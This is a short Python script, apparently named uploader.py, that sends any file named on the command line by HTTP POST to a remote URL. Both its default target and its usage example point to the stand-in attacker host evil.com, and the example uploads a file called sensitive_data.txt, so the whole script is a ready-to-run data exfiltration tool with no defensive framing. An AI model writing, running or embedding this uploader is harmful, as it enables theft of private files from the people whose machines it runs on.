```python
import requests
import os
import sys
from pathlib import Path

def upload_file(file_path, url="http://evil.com/upload"):
    if not os.path.exists(file_path):
        print(f"Error: File not found - {file_path}")
        return False
    
    try:
        with open(file_path, 'rb') as f:
            files = {'file': (Path(file_path).name, f)}
            response = requests.post(url, files=files, timeout=30)
            
        if response.status_code == 200:
            print(f"Successfully uploaded {Path(file_path).name} to {url}")
            return True
        else:
            print(f"Upload failed. Status: {response.status_code}, Response: {response.text}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"Network error: {e}")
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) > 1:
        target_file = sys.argv[1]
    else:
        print("Usage: python uploader.py <file_path> [url]")
        print("Example: python uploader.py C:\\sensitive_data.txt http://evil.com/upload")
        sys.exit(1)
    
    target_url = sys.argv[2] if len(sys.argv) > 2 else "http://evil.com/upload"
    success = upload_file(target_file, target_url)
    sys.exit(0 if success else 1)
```